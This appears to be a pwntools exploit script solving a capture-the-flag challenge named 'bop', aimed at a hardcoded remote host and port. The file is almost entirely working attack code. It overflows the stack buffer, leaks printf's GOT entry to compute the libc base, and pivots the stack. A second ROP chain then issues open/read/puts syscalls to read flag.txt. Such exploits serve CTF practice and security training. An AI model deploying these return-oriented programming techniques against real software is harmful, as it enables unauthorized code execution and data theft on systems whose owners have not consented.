#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bop.elf '--port=30284' '--host=34.148.238.228'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bop.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.148.238.228'
port = int(args.PORT or 30284)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

POP_RDI = 0x00000000004013d3
POP_RSI_R15 = 0x00000000004013d1
POP_RBP = 0x00000000004011fd
LEAVE = 0x00000000004012f7
PRINTF = 0x4010F0
GETS = 0x401100

ROP2_ADDR = 0x404500
BUFFER = 0x404400

io = start()

io.recvuntil(b'Do you bop? ')
rop1 = cyclic(32)
rop1 += p64(ROP2_ADDR - 0x8)
rop1 += p64(POP_RDI)
rop1 += p64(0x404038)							# write .got.plt: printf
rop1 += p64(POP_RSI_R15)
rop1 += p64(0x0)
rop1 += p64(0x0)
rop1 += p64(PRINTF)
##########################
rop1 += p64(POP_RDI)
rop1 += p64(BUFFER)
rop1 += p64(POP_RSI_R15)
rop1 += p64(0x0)
rop1 += p64(0x0)
rop1 += p64(GETS)								# read "flag.txt"
##########################
rop1 += p64(POP_RDI)
rop1 += p64(ROP2_ADDR)
rop1 += p64(POP_RSI_R15)
rop1 += p64(0x0)
rop1 += p64(0x0)
rop1 += p64(GETS)								# read new rop
##########################
rop1 += p64(LEAVE)
io.sendline(rop1)

data = io.recv()								# read address
FUNC_ADDRESS = u64(data.ljust(8, b'\x00'))
libc = ELF("libc-bop.so")
BASE = FUNC_ADDRESS - libc.sym["printf"]

POP_RDX = 0x0000000000142c92 + BASE
POP_RCX_RBX = 0x000000000010257e + BASE
POP_RAX = 0x0000000000036174 + BASE
SYSCALL = 0x00000000000630a9 + BASE
READ = BASE + libc.sym["read"]
PUTS = BASE + libc.sym["puts"]

io.sendline(b'flag.txt\x00')					# send "flag.txt"

rop2 = b''
rop2 += p64(POP_RAX)
rop2 += p64(0x2)
rop2 += p64(POP_RDI)
rop2 += p64(BUFFER)
rop2 += p64(POP_RSI_R15)
rop2 += p64(0x0)
rop2 += p64(0x0)
rop2 += p64(POP_RDX)
rop2 += p64(0x0)
rop2 += p64(SYSCALL)							# open("flag.txt", 0x0, 0x0)
##########################
rop2 += p64(POP_RDI)
rop2 += p64(0x3)								# fd
rop2 += p64(POP_RSI_R15)
rop2 += p64(BUFFER)
rop2 += p64(0x0)
rop2 += p64(POP_RDX)
rop2 += p64(0x38)
rop2 += p64(READ)								# read from flag.txt
##########################
rop2 += p64(POP_RDI)
rop2 += p64(BUFFER)
rop2 += p64(PUTS)								# write from flag.txt
io.sendline(rop2)

io.interactive()

